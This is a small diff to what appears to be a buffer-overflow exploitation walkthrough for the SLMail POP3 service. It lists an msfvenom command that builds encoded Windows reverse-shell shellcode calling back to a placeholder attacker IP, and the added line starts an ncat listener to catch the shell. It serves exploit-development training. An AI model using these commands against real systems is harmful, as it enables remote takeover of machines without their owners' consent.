@@ -22,3 +22,4 @@ Choose one that doesnt contain bad chars (double check that inside the debugger 
 * Place a breakpoint in this address and check it actually reaches it.
 * Generate a shellcode using MSFVENOM (msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKERS_IP> LPORT=<ATTACKERS_PORT> -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "<BAD_CHARS>" (ex. "\x00\x0a\x0d")).
 * Place this shellcode in the exploit POC and make sure to add NOP as padding for the decoder (See slmail_pop3_shellcode.py in repo). 
+* Start a listener on attackers machine and get a shell (ncat -lvnp <LISTENING_PORT>).
